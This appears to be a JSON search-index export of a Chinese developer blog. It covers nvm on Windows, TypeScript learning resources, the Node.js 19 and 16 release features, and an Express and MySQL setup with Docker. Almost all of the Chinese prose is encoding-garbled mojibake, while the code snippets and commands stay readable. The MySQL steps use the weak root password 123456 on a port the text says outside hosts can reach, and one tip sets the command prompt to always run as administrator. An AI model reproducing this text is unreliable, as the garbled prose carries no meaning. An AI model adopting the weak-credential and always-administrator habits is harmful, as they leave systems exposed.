æŒ‡ä»¤å°±æœƒçœ‹åˆ°å‰›å‰›æ–°å¢çš„åˆ¥åæ‰€å°æ‡‰çš„ Node.js ç‰ˆæœ¬ 1 2 3 4 5 6 7 8 9 10 11 12 13 $ nvm alias v16-test -\u0026gt; v10.15.3 default -\u0026gt; v10.16.3 node -\u0026gt; stable (-\u0026gt; v12.8.1) (default) stable -\u0026gt; 12.8 (-\u0026gt; v12.8.1) (default) iojs -\u0026gt; N/A (default) unstable -\u0026gt; N/A (default) lts/* -\u0026gt; lts/erbium (-\u0026gt; N/A) lts/argon -\u0026gt; v4.9.1 (-\u0026gt; N/A) lts/boron -\u0026gt; v6.17.1 (-\u0026gt; N/A) lts/carbon -\u0026gt; v8.16.2 (-\u0026gt; N/A) lts/dubnium -\u0026gt; v10.17.0 (-\u0026gt; N/A) lts/erbium -\u0026gt; v12.13.0 (-\u0026gt; N/A) å¸¸è¦‹éŒ¯èª¤åŸå›  å ±éŒ¯ exit status 1(æˆ– exit status 5) å•é¡Œ å‡ºç¾ exit status 1 å­˜å–è¢«æ‹’ æˆ– exit status 5 å­˜å–è¢«æ‹’ï¼Œéœ€è¦ç”¨ç®¡ç†å“¡èº«åˆ†æ‰“é–‹ cmd å‘½ä»¤åˆ—å·¥å…·ï¼Œå†åŸ·è¡Œ nvm use \u0026lt;version\u0026gt; å³å¯ã€‚\nå ±éŒ¯ exit status 145 å•é¡Œ é€™å€‹å•é¡Œå¯ä»¥åœ¨ github nvm-windows ä¸‹æ‰¾åˆ°ç­”æ¡ˆï¼Œnvm å®‰è£çš„æ™‚å€™æœ‰å…©å€‹å®‰è£ç›®éŒ„ï¼Œä¸€å€‹æ˜¯ nvm å®‰è£ç›®éŒ„ï¼Œä¸€å€‹æ˜¯ nodejs å®‰è£ç›®éŒ„ï¼Œé€™å…©å€‹å®‰è£ç›®éŒ„åä¸èƒ½å‡ºç¾ç©ºæ ¼æˆ–ä¸­æ–‡ï¼Œä½†æ˜¯ nodejs é»˜èªå®‰è£ç›®éŒ„æ˜¯ C:\\Program Files\\nodejsï¼Œé€™å€‹ç›®éŒ„ä¸­é–“æœ‰ç©ºæ ¼ï¼Œéœ€è¦æˆ‘å€‘è‡ªå®šç¾©ä¸€å€‹å®‰è£ç›®éŒ„ï¼Œå³å¯è§£æ±ºé€™å€‹å•é¡Œã€‚\nBONUSï¼šæ°¸é ä»¥ç³»çµ±ç®¡ç†è€…èº«ä»½åŸ·è¡Œ æ¯æ¬¡éƒ½è¦ä½¿ç”¨ã€Œä»¥ç³»çµ±ç®¡ç†è€…èº«ä»½åŸ·è¡Œã€ä¾†é–‹å•Ÿçµ‚ç«¯æ©Ÿæ˜¯çœŸçš„æ»¿éº»ç…©çš„ï¼Œæ‰€ä»¥ä½ å…¶å¯¦å¯ä»¥é‡å°æ‡‰ç”¨ç¨‹å¼æ°¸é ã€Œä»¥ç³»çµ±ç®¡ç†è€…èº«ä»½åŸ·è¡Œã€ï¼Œé¦–å…ˆé»ä½ è¦æ°¸é åŸ·è¡Œçš„ç¨‹å¼å³éµé¸å…§å®¹\né»é¸ä¸‹æ–¹é€²éš\nå°‡ã€Œä»¥ç³»çµ±ç®¡ç†å“¡èº«ä»½åŸ·è¡Œã€æ‰“å‹¾\næå®šï¼Œä¹‹å¾Œä½¿ç”¨æ·å¾‘æ‰“é–‹ cmd æ™‚ï¼Œçš†ç‚ºã€Œä»¥ç³»çµ±ç®¡ç†å“¡èº«ä»½åŸ·è¡Œã€\nç¸½çµ nvm æŒ‡ä»¤æ•´ç†\næŒ‡ä»¤ åŠŸèƒ½ nvm versionnvm v æŸ¥çœ‹ nvm ç‰ˆæœ¬ nvm install \u0026lt;version\u0026gt; å®‰è£æŒ‡å®š \u0026lt;version\u0026gt; ç‰ˆæœ¬çš„ Node.js(å»ºè­°å®‰è£ LTS ç‰ˆæœ¬) nvm lsnvm ls installed æŸ¥çœ‹ç›®å‰å·²å®‰è£çš„ Node.js ç‰ˆæœ¬ nvm ls available æŸ¥çœ‹ç›®å‰å¯å®‰è£çš„ Node.js ç‰ˆæœ¬ nvm use \u0026lt;version\u0026gt; åˆ‡æ›æŒ‡å®š \u0026lt;version\u0026gt; ç‰ˆæœ¬çš„ Node.js nvm current æŸ¥çœ‹ç•¶å‰ä½¿ç”¨çš„ Node.js ç‰ˆæœ¬ ","date":"2022-10-27T00:00:00Z","image":"https://live.staticflickr.com/65535/52457342886_5035af0537_o.png","permalink":"https://wayneblog.ga/2022-10-27/nodejs-nvm/","title":"nvm - Nodejs ç‰ˆæœ¬éš¨ä½ åˆ‡æ›"},{"content":" åƒè€ƒç¶²ç«™\nTypeScript æ˜¯å¾®è»Ÿé–‹ç™¼çš„ä¸€å€‹é–‹æºçš„ç·¨ç¨‹èªè¨€ï¼Œé€šéåœ¨ JavaScript çš„åŸºç¤ä¸Šæ·»åŠ éœæ…‹é¡å‹å®šç¾©æ§‹å»ºè€Œæˆã€‚TypeScript é€šé TypeScript ç·¨è­¯å™¨æˆ– Babel è½‰è­¯çˆ² JavaScript ä»£ç¢¼ï¼Œå¯é‹è¡Œåœ¨ä»»ä½•ç€è¦½å™¨å’Œæ“ä½œç³»çµ±ã€‚ä¸‹é¢ä¾†åˆ†äº« 10 å€‹å€¼å¾—å­¸ç¿’çš„ TypeScript å¯¶åº«ï¼\nTypeScript å®˜æ–¹æ–‡æª” TypeScript å®˜æ–¹æ–‡æª”ï¼Œæä¾›äº†ä¸­æ–‡ç‰ˆæœ¬ã€‚\nGithubï¼šhttps://github.com/microsoft/TypeScript\nå­¸ç¿’ TypeScript é»æˆ‘å‰å¾€\nå¯èƒ½æ˜¯ä¸­åœ‹æœ€å¥½çš„ TypeScript å…¥é–€åˆ°é€²éšç³»çµ±æ•™ç¨‹ã€‚\nGithubï¼šhttps://github.com/mqyqingfeng/learn-typescript\nTypeScript ä½¿ç”¨æŒ‡å—æ‰‹å†Š é»æˆ‘å‰å¾€\nTypeScript ä½¿ç”¨æ‰‹å†Šï¼ˆä¸­æ–‡ç‰ˆï¼‰ç¿»è­¯ã€‚\nGithubï¼šhttps://github.com/zhongsp/TypeScript\næ·±å…¥ç†è§£ TypeScript é»æˆ‘å‰å¾€\nTypeScript Deep Dive ä¸­æ–‡ç‰ˆã€‚\nGithubï¼šhttps://github.com/jkchao/typescript-book-chinese\nTypeScript å…¥é–€æ•™ç¨‹ é»æˆ‘å‰å¾€\nå¾ JavaScript ç¨‹åºå“¡çš„è§’åº¦ç¸½çµæ€è€ƒï¼Œå¾ªåºæ¼¸é€²åœ°ç†è§£ TypeScriptã€‚\nGithubï¼šhttps://github.com/xcatliu/typescript-tutorial\nTypeScript é¡å‹æŒ‘æˆ° é»æˆ‘å‰å¾€\né«˜è³ªé‡çš„é¡å‹å¯ä»¥æé«˜é …ç›®çš„å¯ç¶­è­·æ€§ä¸¦é¿å…ä¸€äº›æ½›åœ¨çš„æ¼æ´ã€‚æœ¬é …ç›®æ„åœ¨æ–¼è®“ä½ æ›´å¥½åœ°ç­è§£ TS çš„é¡å‹ç³»çµ±ï¼Œç·¨å¯«ä½ è‡ªå·±çš„é¡å‹å·¥å…·ï¼Œæˆ–è€…åªæ˜¯å–®ç´”çš„äº«å—æŒ‘æˆ°çš„æ¨‚è¶£ï¼\nGithubï¼šhttps://github.com/type-challenges/type-challenges\nDefinitelyTyped DefinitelyTyped åŒ…å«å¤§é‡çš„é«˜è³ªé‡çš„ TypeScript é¡å‹å®šç¾©ã€‚é€šéä½¿ç”¨ DefinitelyTyped åŠå…¶åŒ…å«çš„è²æ˜æ–‡ä»¶ï¼Œæˆ‘å€‘å¯ä»¥ä½¿ç”¨å¤§å¤šæ•¸æµè¡Œçš„ JavaScript åº«ï¼Œå°±åƒå®ƒå€‘æ˜¯ TypeScript åº«ä¸€æ¨£ï¼Œå°‡é€šéç·¨è­¯å™¨é€²è¡Œé¡å‹é©—è­‰ã€‚\nGithubï¼šhttps://github.com/DefinitelyTyped/DefinitelyTyped\nreact-redux-typescript-guide é»æˆ‘å‰å¾€\næœ¬æŒ‡å—è¨˜éŒ„äº†æœ‰é—œåœ¨ Reactï¼ˆåŠå…¶ç”Ÿæ…‹ç³»çµ±ï¼‰ä¸­ä»¥å‡½æ•¸å¼é¢¨æ ¼ä½¿ç”¨ TypeScript çš„æ¨¡å¼å’Œç¥•è¨£ã€‚å®ƒå°‡ä½¿ä»£ç¢¼é¡å‹å®‰å…¨ï¼ŒåŒæ™‚å°ˆæ³¨æ–¼å¾å¯¦ç¾ä¸­æ¨æ–·é¡å‹ï¼Œå¾é•·é ä¾†çœ‹æ›´å®¹æ˜“ç·¨å¯«å’Œç¶­è­·æ­£ç¢ºçš„é¡å‹ã€‚\nGithubï¼šhttps://github.com/piotrwitek/react-redux-typescript-guide\nReact+TypeScript å‚™å¿˜éŒ„ é»æˆ‘å‰å¾€\nå°ˆæ³¨æ–¼å¹«åŠ© React é–‹ç™¼äººå“¡åœ¨ React æ‡‰ç”¨ä¸­ä½¿ç”¨ TypeScriptã€‚\nGithubï¼šhttps://github.com/typescript-cheatsheets/react\nclean-code-typescript é»æˆ‘å‰å¾€\nå°‡ Clean Code çš„æ¦‚å¿µé©ç”¨åˆ° TypeScriptï¼Œå¼•å°è®€è€…ä½¿ç”¨ TypeScript ç·¨å¯«æ˜“è®€ã€å¯æ“´å±•çš„æ‡‰ç”¨ã€‚\nGithubï¼šhttps://github.com/labs42io/clean-code-typescript\nè°·æ­Œ TypeScript é¢¨æ ¼æŒ‡å— é»æˆ‘å‰å¾€\nGoogle TypeScript é¢¨æ ¼æŒ‡å—ã€‚\nGithubï¼šhttps://google.github.io/styleguide/tsguide.html\nAwesome TypeScript é»æˆ‘å‰å¾€\nå¾ˆæ£’çš„ TypeScript è³‡æºã€‚\nGithubï¼šhttps://github.com/semlinker/awesome-typescript\n","date":"2022-10-27T00:00:00Z","image":"https://live.staticflickr.com/65535/52458187213_d3e26e7c48_o.png","permalink":"https://wayneblog.ga/2022-10-27/ts-learning-12-website/","title":"æ¨è–¦ 12 å€‹å€¼å¾—å­¸ç¿’çš„ TypeScript å¯¶åº«ï¼"},{"content":" åƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\nNode.js 19 åœ¨ 2022-10-18 æ­£å¼ç™¼å¸ƒäº†ï¼Œæ­¤æ¬¡æ›´æ–°åŒ…æ‹¬å°‡ V8 JavaScript å¼•æ“æ›´æ–°åˆ° 10.7ï¼Œä»¥åŠé»˜èªå•Ÿç”¨ HTTP (s)/1.1 KeepAliveã€‚\nNode.js 18 åœ¨æœ¬æœˆæ™šäº›æ™‚å€™å°‡é€²å…¥é•·æœŸæ”¯æŒï¼ˆLTSï¼‰ï¼ŒNode.js 19 å°‡å–ä»£ Node.js 18 æˆç‚º \u0026ldquo;Current\u0026rdquo; ç‰ˆæœ¬ã€‚\nå®˜æ–¹æ–‡æª” node \u0026ndash;watch (å¯¦é©—æ€§) é‹è¡Œæ™‚ï¼Œå¢åŠ äº†ä¸€å€‹ä»¤äººèˆˆå¥®çš„åŠŸèƒ½ï¼Œæ”¯æŒä½¿ç”¨ node --watchï¼Œé¸é …åœ¨ \u0026ldquo;watch\u0026rdquo; æ¨¡å¼ä¸‹é‹è¡Œã€‚åœ¨ \u0026ldquo;watch\u0026rdquo; æ¨¡å¼ä¸‹é‹è¡Œï¼Œç•¶å°å…¥çš„æ–‡ä»¶è¢«æ”¹è®Šæ™‚ï¼Œæœƒé‡æ–°å•Ÿå‹•é€²ç¨‹ã€‚\n1 node --watch index.js æ­¤åŠŸèƒ½åœ¨ v19.0.0 å’Œ v18.11.0+ ä¸­å¯ç”¨ã€‚\né»˜èªå•Ÿç”¨ HTTP(S)/1.1 KeepAlive å¾é€™å€‹ç‰ˆæœ¬é–‹å§‹ï¼ŒNode.js é»˜èªå°‡ keepAlive è¨­ç½®ç‚º trueï¼Œé€™æ„å‘³è‘—ä»»ä½•å‡ºç«™çš„ HTTP (s) é€£ç·šå°‡è‡ªå‹•ä½¿ç”¨ HTTP 1.1 Keep-Aliveã€‚é»˜èªçš„ keep-alive æ™‚é–“æ˜¯ 5 ç§’ã€‚\nå•Ÿç”¨ keep-alive å°‡æä¾›æ›´å¥½çš„ååé‡ï¼Œå› ç‚ºé€£æ¥åœ¨é»˜èªæƒ…æ³ä¸‹è¢«é‡è¤‡ä½¿ç”¨ã€‚\nç©©å®šçš„ WebCrypto WebCrypto API ç¾åœ¨å·²ç¶“ç©©å®šï¼ˆä»¥ä¸‹ç®—æ³•é™¤å¤–ï¼šEd25519ã€Ed448ã€X25519 å’ŒX448)\nä½¿ç”¨ globalThis.crypto æˆ– require('node:crypto').webcrypto ä¾†è¨ªå•é€™å€‹æ¨¡å¡Šã€‚\nè‡ªå®šç¾© ESM Resolution èª¿æ•´ Node.js å·²ç¶“åˆªé™¤äº† --experimental-specifier-resolution æ¨™èªŒï¼Œå…¶åŠŸèƒ½ç¾åœ¨å¯ä»¥é€šéè‡ªå®šç¾©åŠ è¼‰å™¨å¯¦ç¾ã€‚\nç§»é™¤ DTrace/SystemTap/ETW æ”¯æŒ å° DTrace/SystemTap/ETW çš„æ”¯æŒåœ¨ v19.0.0 ä¸­è¢«ç§»é™¤ï¼Œä¸»è¦åŸå› æ˜¯è³‡æºçš„å„ªå…ˆç´šå•é¡Œã€‚\nå¦‚æœä½ æœ‰èˆˆè¶£å¹«åŠ©æ¢å¾© DTraceï¼Œå¯ä»¥æŸ¥çœ‹è©² issueï¼šhttps://github.com/nodejs/node/issues/44550ã€‚\nä¾è³´ V8 10.7 V8 å¼•æ“å·²ç¶“æ›´æ–°åˆ° 10.7 ç‰ˆæœ¬ï¼Œé€™æ˜¯ Chromium 107 çš„ä¸€éƒ¨åˆ†ã€‚é€™å€‹ç‰ˆæœ¬åŒ…æ‹¬äº† JavaScript API çš„ä¸€å€‹æ–°ç‰¹æ€§ï¼šIntl.NumberFormatã€‚\nIntl.NumberFormatv3 API æ˜¯ä¸€å€‹æ–°çš„ TC39 ECMA402 ç¬¬ä¸‰éšæ®µææ¡ˆï¼Œæ“´å±•äº†å…ˆå‰å­˜åœ¨çš„ Intl.NumberFormatã€‚\nllhttp Node.js 19 æ­è¼‰äº† llhttp@8.1.0\nnpm Node.js 19 æ­è¼‰äº† npm@8.19.2\nNode.js 18 å°‡é€²å…¥ LTS Node.js 18 ç³»åˆ—å°‡åœ¨ä¸‹é€±éæ¸¡åˆ°é•·æœŸæ”¯æŒç‰ˆæœ¬ã€‚\nç”Ÿå‘½é€±æœŸ Node.js 14 å°‡åœ¨ 2023 å¹´ 4 æœˆé”åˆ°ç”Ÿå‘½é€±æœŸçµæŸï¼Œå› æ­¤å»ºè­°ç”¨æˆ¶é–‹å§‹è¨ˆåŠƒå‡ç´šåˆ° Node.js 16ï¼ˆLTSï¼‰æˆ– Node.js 18ï¼ˆLTSï¼‰ã€‚\nNode.js 16 (LTS) å°‡åœ¨ 2023 å¹´ 9 æœˆé”åˆ°ç”Ÿå‘½é€±æœŸçµæŸï¼Œæ¯”åŸè¨ˆåŠƒ 2024 å¹´ 4 æœˆæå‰äº†ã€‚\næ›´å¤šè©³æƒ…å¯æŸ¥çœ‹ï¼šhttps://nodejs.org/en/blog/announcements/v19-release-announce/\nè£œå……ï¼š Nodejs 16 çš„æ–°ç‰¹æ€§ åŸæ–‡ç¶²å€ï¼šhttps://weekly.shanyue.tech/release/node-16/\nNode 16 æ–¼å››æœˆäºŒåæ—¥ç™¼å¸ƒï¼Œå±±æœˆåœ¨ç¬¬ä¸€æ™‚é–“ä¸‹è¼‰äº†Node16 é«”é©—äº†ä»¥ä¸‹æ–°ç‰¹æ€§ã€‚å¶æ•¸è™Ÿçš„ç‰ˆæœ¬ç‚ºLTS ç‰ˆæœ¬ï¼Œé€™å°‡æ˜¯æ—¢Node14 ä¹‹å¾Œçš„ä¸‹ä¸€å€‹é•·æœŸæ”¯æŒç‰ˆæœ¬ï¼ŒNode14 åœ¨2020-10-27 å·²é€²å…¥ Active LTS éšæ®µï¼Œé‚„æ²’æœ‰å‡ç´šçš„åŒå­¸è¦ç›¡é‡æ›´æ–°å‘€ã€‚\nå¾ Node 16 Release å®˜æ–¹æ–‡æª” åˆ—å‡ºäº†æ­¤æ¬¡å®ƒæ‰€æœ‰çš„æ–°ç‰¹æ€§ä»¥åŠéå¸¸è©³ç´°çš„æäº¤è¨˜éŒ„ã€‚é‚£å®ƒåˆ°åº•æ›´æ–°äº†å“ªäº›æ–°ç‰¹æ€§ï¼Œå…ˆè®“æˆ‘å€‘ä¸€ç¹ç‚ºå¿«å§ï¼\nTimers Promise API Timers Promise API å…¶å¯¦åœ¨ Node 15 å°±å·²å­˜åœ¨ï¼Œé‚£æ™‚å€™æ˜¯ä¸€å€‹å¯¦é©—ç‰¹æ€§ï¼Œç›®å‰å·²é€²å…¥äº†ç©©å®šéšæ®µï¼Œæ˜¯ä¸€é …ä»¤äººèˆˆå¥®çš„ç‰¹æ€§ã€‚é‚£å®ƒåˆ°åº•æ˜¯å¹¹ä»€éº¼ç”¨çš„å‘¢ï¼Ÿ\nå…ˆåˆ¥æ€¥ï¼Œåœ¨æ­¤ä¹‹å‰ï¼Œå…ˆçœ‹ä¸€å€‹å•é¡Œï¼šå¦‚ä½•å¯¦ç¾ä¸€å€‹sleep/delay å‡½æ•¸ï¼Ÿ\nç­”æ¡ˆä¹Ÿå¾ˆç°¡å–®ï¼Œä½¿ç”¨ Promise å°è£ä¸€å€‹ setTimeout å³å¯\n1 const sleep = (t = 0) =\u0026gt; new Promise(resolve =\u0026gt; setTimeout(resolve, t)); é‚£æœ‰äº† Timers Promise ä¹‹å¾Œå‘¢ï¼Œä½¿ç”¨ setTimeout ç›´æ¥å¯æ›¿ä»£ sleep åŠŸèƒ½ï¼Œé©šä¸é©šå–œã€‚\n1 2 3 import { setTimeout } from \u0026#39;timers/promises\u0026#39;; await setTimeout(100); setTimeout çš„ç¬¬äºŒå€‹åƒæ•¸æ¥æ”¶ä¸€å€‹å€¼ï¼Œä½œç‚º Promise æˆåŠŸå¾Œçš„è¿”å›å€¼\n1 2 3 4 const r = await setTimeout(100, \u0026#39;hello, world\u0026#39;); //=\u0026gt; hello, world console.log(r); è€Œç•¶ setInterval ä¹Ÿè®Šç‚º Promise å½¢å¼å¾Œï¼Œå°æ–¼æ¯é–“éš”ä¸€åˆ†é˜ä¾¿åŸ·è¡Œæ“ä½œçš„å®šæ™‚ä»»å‹™è€Œè¨€ï¼Œå…·æœ‰æ›´å¤§çš„å¯è®€æ€§\n1 2 3 4 5 6 7 import { setInterval } from \u0026#39;timers/promises\u0026#39;; for await (const startTime of setInterval(100, Date.now())) { const now = Date.now(); if ((now - startTime) \u0026gt; 1000) break; }; åº•å±¤ä¾è³´å‡ç´š æˆ‘å€‘çŸ¥é“ï¼ŒNode åŸºæ–¼ v8ã€libuvã€llhttp ç­‰è«¸å¤šä¾è³´ï¼Œé€™æ¬¡å®ƒå°è«¸å¤šä¾è³´é€²è¡Œäº†å‡ç´šã€‚å¦‚åŒæˆ‘å€‘çš„æ¥­å‹™é …ç›®ä¾è³´æ–¼è«¸å¤šè»Ÿä»¶åŒ…ï¼Œæ¯ä¸€æ¬¡ä¾è³´çš„å‡ç´šä¹Ÿæœƒå°æ€§èƒ½é€ æˆä¸å°‘æå‡\nv8 å‡ç´šåˆ° 9.0ï¼Œä¸»è¦æ˜¯ ECMAScript RegExp Match Indices llhttp å‡ç´šåˆ° 6.0.0ï¼Œç”¨ä»¥è§£æ HTTP å ±æ–‡ icu å‡ç´šåˆ° 69.1 npm å‡ç´šåˆ° 7.10.0 ä½¿ç”¨ process.versions å¯çœ‹åˆ°ç›¸é—œä¾è³´çš„ç‰ˆæœ¬è™Ÿ\n1 \u0026gt; process.versions export 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 { \u0026#34;node\u0026#34;: \u0026#34;16.0.0\u0026#34;, \u0026#34;v8\u0026#34;: \u0026#34;9.0.257.17-node.10\u0026#34;, \u0026#34;uv\u0026#34;: \u0026#34;1.41.0\u0026#34;, \u0026#34;zlib\u0026#34;: \u0026#34;1.2.11\u0026#34;, \u0026#34;brotli\u0026#34;: \u0026#34;1.0.9\u0026#34;, \u0026#34;ares\u0026#34;: \u0026#34;1.17.1\u0026#34;, \u0026#34;modules\u0026#34;: \u0026#34;93\u0026#34;, \u0026#34;nghttp2\u0026#34;: \u0026#34;1.42.0\u0026#34;, \u0026#34;napi\u0026#34;: \u0026#34;8\u0026#34;, \u0026#34;llhttp\u0026#34;: \u0026#34;6.0.0\u0026#34;, \u0026#34;openssl\u0026#34;: \u0026#34;1.1.1k+quic\u0026#34;, \u0026#34;cldr\u0026#34;: \u0026#34;39.0\u0026#34;, \u0026#34;icu\u0026#34;: \u0026#34;69.1\u0026#34;, \u0026#34;tz\u0026#34;: \u0026#34;2021a\u0026#34;, \u0026#34;unicode\u0026#34;: \u0026#34;13.0\u0026#34;, \u0026#34;ngtcp2\u0026#34;: \u0026#34;0.1.0-DEV\u0026#34;, \u0026#34;nghttp3\u0026#34;: \u0026#34;0.1.0-DEV\u0026#34; } btoa èˆ‡ atob é—œæ–¼ Base64 çš„è½‰åŒ–ï¼ŒNode åœ¨ä»¥å‰ä½¿ç”¨äº† Buffer.fromï¼Œè€Œç¾åœ¨æ”¯æŒ btoa/atob èˆ‡ç€è¦½å™¨ç’°å¢ƒä¿æŒäº†ä¸€è‡´ã€‚\nè€Œå°æ–¼ä¸€å€‹ SSR é …ç›®è€Œè¨€ï¼ŒåŸ·è¡Œç’°å¢ƒçš„å€åˆ†å°‡ç„¡é—œç·Šè¦ï¼Œçµ±ä¸€ä½¿ç”¨ btoa/atob å°±å¥½äº†\n1 2 3 4 5 6 7 8 const base64 = { encode (v: string) { return isBrowser ? btoa(v) : Buffer.from(v).toString(\u0026#39;base64\u0026#39;); }, decode (v: string) { return isBrowser ? atob(v) : Buffer.from(v, \u0026#39;base64\u0026#39;).toString(); } } æ›´å¤š é—œæ–¼ Node16 å‡ç´šçš„è«¸å¤šå°ç´°ç¯€ï¼Œå¯åƒé–±ç‰ˆæœ¬ç™¼å¸ƒç²å–æ›´å¤šä¿¡æ¯ï¼Œå¯æŒçºŒ Wayne\u0026rsquo;s Blog å°å„è»Ÿä»¶æ¯ä¸€æ¬¡é‡å¤§ç‰ˆæœ¬å‡ç´šçš„èªªæ˜è¬›è§£ã€‚\n","date":"2022-10-24T00:00:00Z","image":"https://live.staticflickr.com/65535/52449163172_6f0c5b3278_o.jpg","permalink":"https://wayneblog.ga/2022-10-24/nodejs-v19-release/","title":"Node v19 æ­£å¼ç™¼å¸ƒ"},{"content":" åƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\næœ¬æ–‡ä¸»è¦æ˜¯å±•ç¤ºä½¿ç”¨ Express å’Œ MySQL ä¾†æ­å»ºé …ç›®æ¡†æ¶çš„æ­¥é©Ÿï¼Œå±•ç¤ºç­å¦‚ä½•æ­å»ºé …ç›®ä¸¦é€²è¡ŒåŸºæœ¬æ“ä½œã€‚\nå‰µå»ºé …ç›® Express æ˜¯åŸºæ–¼ Node.js å¹³å°ï¼Œå¿«é€Ÿã€é–‹æ”¾ã€æ¥µç°¡çš„ Web é–‹ç™¼æ¡†æ¶ã€‚\nå…¨å±€å®‰è£ express-generator express-generator æ˜¯ Express æ‡‰ç”¨ç¨‹åºç”Ÿæˆå™¨å·¥å…·ï¼Œæˆ‘å€‘å¯ä»¥ä½¿ç”¨å®ƒä¾†å¿«é€Ÿå‰µå»ºæ‡‰ç”¨ç¨‹åºæ¡†æ¶ã€‚\n1 2 3 4 npm install -g express-generator # (expressFrame æ˜¯é …ç›®å) express expressFrame é …ç›®çš„ç›®éŒ„çµæ§‹\nbin/www æ˜¯å•Ÿå‹•å…¥å£æ–‡ä»¶ï¼Œåœ¨è£¡é¢å¯ä»¥è¨­ç½®ç«¯å£è™Ÿç­‰ ä¸‹è¼‰ä¾è³´ å‰µå»ºå¥½é …ç›®ä¹‹å¾Œï¼Œè£¡é¢æœ‰åŒ…å«åŸºæœ¬çš„é …ç›®æ–‡ä»¶ï¼Œä¹Ÿæœ‰ç›¸é—œä¾è³´\n1 npm install å•Ÿå‹•é …ç›® 1 2 3 4 npm start # å•Ÿå‹•å‘½ä»¤é‚„å¯ä»¥æ˜¯ï¼š # node ./bin/www å®‰è£ nodemon å¯ä»¥å®‰è£ nodemon ä¾†ç›£æ§ node.js æºä»£ç¢¼çš„ä»»ä½•è®ŠåŒ–å’Œè‡ªå‹•é‡å•Ÿä½ çš„æœå‹™å™¨\nå…¨å±€å®‰è£ nodemonï¼š\n1 npm install -g nodemon å•Ÿå‹•é …ç›®\n1 nodemon bin/www é€™å°±å•Ÿå‹•æˆåŠŸå•¦\nç€è¦½å™¨æ‰“é–‹http://localhost:3000å°±èƒ½çœ‹åˆ°é é¢å•¦\nå®‰è£ winston æ·»åŠ æ‰“å°æ—¥èªŒæ–‡ä»¶ é€™è£¡æ¡ç”¨çš„æ˜¯ winston æ—¥èªŒ\nå…·é«”ç”¨æ³•å¯çœ‹æ–‡æª”ï¼šhttps://www.npmjs.com/package/winston\n1 npm i winston é…ç½®æ‰“å°æ—¥èªŒæ ¼å¼ åœ¨é …ç›®çš„æ ¹ç›®éŒ„æ·»åŠ ä¸€å€‹é…ç½®æ‰“å°æ—¥èªŒæ ¼å¼çš„æ–‡ä»¶ logger.js ï¼ˆæ­¤æ–‡ä»¶åœ¨ github ä¸Šï¼‰\nä¿®æ”¹ app.js çš„é…ç½® ä¿®æ”¹é …ç›®é»˜èªçš„è®Šé‡åï¼š\nå°‡ const logger = require('morgan'); æ”¹æˆï¼šconst morgan = require('morgan') ç›¸æ‡‰çš„ä¹Ÿè¦æŠŠ app.use(logger('dev')); æ”¹æˆï¼šapp.use(morgan('dev')); 1 2 3 4 5 6 7 // ... - const logger = require(\u0026#39;morgan\u0026#39;); + const morgan = require(\u0026#39;morgan\u0026#39;); - app.use(logger(\u0026#39;dev\u0026#39;)); + app.use(morgan(\u0026#39;dev\u0026#39;)); // ... å¼•å…¥ logger.js æ–‡ä»¶ 1 const logger = require(\u0026#39;./logger\u0026#39;) ä¿®æ”¹éŒ¯èª¤è™•ç† å°‡éŒ¯èª¤æ‰“å°åˆ°æ—¥èªŒä¸Š\næ¸¬è©¦æ—¥èªŒæ˜¯å¦æ‰“å°æˆåŠŸ è«‹æ±‚ä¸€å€‹ä¸å­˜åœ¨çš„è·¯ç”±ï¼Œå¦‚ï¼šhttp://localhost:3000/hello\næ‰“é–‹æ—¥èªŒæ–‡ä»¶ï¼Œçœ‹åˆ°é€™æ¢éŒ¯èª¤è¢«æ‰“å°å‡ºä¾†å°±æˆåŠŸå•¦\nMySQL å•Ÿå‹•æ•¸æ“šåº« é€™è£¡ä½¿ç”¨çš„æ–¹æ³•æ˜¯ç”¨ Docker å®‰è£ MySQL\né€™è£¡æ˜¯å®‰è£çš„æ•™ç¨‹ï¼šhttps://www.runoob.com/docker/docker-install-mysql.html\ndocker æ‹‰å– MySQL é¡åƒ 1 docker pull mysql:latest æŸ¥çœ‹æœ¬åœ°é¡åƒ 1 docker images é‹è¡Œå®¹å™¨ 1 2 # docker run -itd --name {å®¹å™¨å} -p 3306:3306 -e MYSQL_ROOT_PASSWORD={MySQL root å¯†ç¢¼} mysql docker run -itd --name mysql-test -p 3306:3306 -e MYSQL_ROOT_PASSWORD=123456 mysql åƒæ•¸èªªæ˜ï¼š\n-p 3306:3306ï¼šæ˜ å°„å®¹å™¨æœå‹™çš„3306ç«¯å£åˆ°å®¿ä¸»æ©Ÿçš„3306ç«¯å£ï¼Œå¤–éƒ¨ä¸»æ©Ÿå¯ä»¥ç›´æ¥é€é å®¿ä¸»æ©Ÿip:3306 è¨ªå•åˆ° MySQL çš„æœå‹™ã€‚ MYSQL_ROOT_PASSWORD=123456ï¼šè¨­ç½® MySQL æœå‹™ root ç”¨æˆ¶çš„å¯†ç¢¼ã€‚ å®‰è£æˆåŠŸ é€é docker ps å‘½ä»¤æŸ¥çœ‹æ˜¯å¦å®‰è£æˆåŠŸ\næœ¬æ©Ÿå¯ä»¥é€šé root / 123456 è¨ªå• MySQL æœå‹™ã€‚\nå®‰è£æ•¸æ“šåº«ç®¡ç†å·¥å…· Sequel Pro macOS ç”¨æˆ¶å®‰è£ navicat windows ç”¨æˆ¶å®‰è£ é€™è£¡é¸æ“‡ç”¨ Sequel Pro å•Ÿå‹•å¥½æ•¸æ“šä¹‹å¾Œï¼Œå°±åœ¨ Sequel Pro é€£æ¥æ•¸æ“šåº«ï¼Œå¯†ç¢¼æ˜¯å•Ÿå‹•æ•¸æ“šåº«æ™‚è‡ªå·±è¨­ç½®çš„å¯†ç¢¼\nä½¿ç”¨ Navicat æ•¸æ“šåº«ç®¡ç†å·¥å…·é€£ç·šæ™‚ï¼Œå‡ºç¾éŒ¯èª¤ è‹¥å‡ºç¾ 1251 - Client does not support authentication protocol requested by server; consider upgrading MySQL client éŒ¯èª¤ï¼ŒåŸå› ç‚ºï¼š\nmysql8 ä¹‹å‰çš„ç‰ˆæœ¬ï¼ŒåŠ å¯†è¦å‰‡æ˜¯ mysql_native_passwordï¼Œè€Œ mysql8 ä¹‹å¾Œçš„ç‰ˆæœ¬ï¼ŒåŠ å¯†è¦å‰‡æ˜¯ caching_sha2_password\nè§£æ±ºæ–¹æ³•ï¼š å‡ç´š navicat é©…å‹•ã€‚ é€²åˆ°å®¹å™¨å…§ï¼ŒæŠŠ mysql ç”¨æˆ¶ç™»å…¥å¯†ç¢¼åŠ å¯†è¦å‰‡é‚„åŸæˆ mysql_native_password 